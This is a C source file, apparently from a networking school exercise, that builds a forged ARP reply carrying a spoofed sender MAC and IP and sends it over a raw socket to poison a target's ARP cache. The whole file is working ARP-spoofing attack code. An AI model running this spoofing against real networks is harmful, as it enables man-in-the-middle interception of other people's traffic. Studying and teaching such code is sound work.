#include "ft_malcolm.h"

static void init_spoofed_eth(t_malcolm *malcolm, struct ethhdr *eth)
{
	ft_memcpy(eth->h_dest, malcolm->target.mac, ETH_ALEN);
	ft_memcpy(eth->h_source, malcolm->source.mac, ETH_ALEN);
	eth->h_proto = htons(ETH_P_ARP);
}

static void init_spoofed_arp(t_malcolm *malcolm, t_arphdr *arp)
{
	arp->ar_hrd = malcolm->packet.arp->ar_hrd;
	arp->ar_pro = malcolm->packet.arp->ar_pro;
	arp->ar_hln = malcolm->packet.arp->ar_hln;
	arp->ar_pln = malcolm->packet.arp->ar_pln;
	arp->ar_op = htons(ARPOP_REPLY);
	ft_memcpy(arp->ar_sha, malcolm->source.mac, ETH_ALEN);
	ft_memcpy(arp->ar_sip, malcolm->source.ip, 4);
	ft_memcpy(arp->ar_tha, malcolm->target.mac, ETH_ALEN);
	ft_memcpy(arp->ar_tip, malcolm->target.ip, 4);
}

int send_spoofed_arp(t_malcolm *malcolm)
{
	t_arp_packet spoofed_packet;
	struct ethhdr eth;
	t_arphdr arp;
	char buffer[ETH_FRAME_MIN];

	spoofed_packet.eth = &eth;
	spoofed_packet.arp = &arp;

	if (malcolm->verbose)
	{
		printf("received an ARP request (broadcast) from target!\n");
	}

	init_spoofed_eth(malcolm, spoofed_packet.eth);
	init_spoofed_arp(malcolm, spoofed_packet.arp);

	if (malcolm->verbose)
	{
		printf("spoofed packet:\n");
		print_arp_packet(spoofed_packet);
	}

	ft_memset(buffer, 0, ETH_FRAME_MIN);
	ft_memcpy(buffer, spoofed_packet.eth, sizeof(struct ethhdr));
	ft_memcpy(buffer + sizeof(struct ethhdr), spoofed_packet.arp, sizeof(t_arphdr));

	if (sendto(malcolm->sockfd, buffer, ETH_FRAME_MIN, 0,
			   (struct sockaddr *)&malcolm->sll, sizeof(malcolm->sll)) < 0)
	{
		return (handle_error("sendto"));
	}

	if (malcolm->verbose)
	{
		printf(GREEN "sent packet to target.\ncheck arp cache!\n" RESET);
	}

	return 0;
}
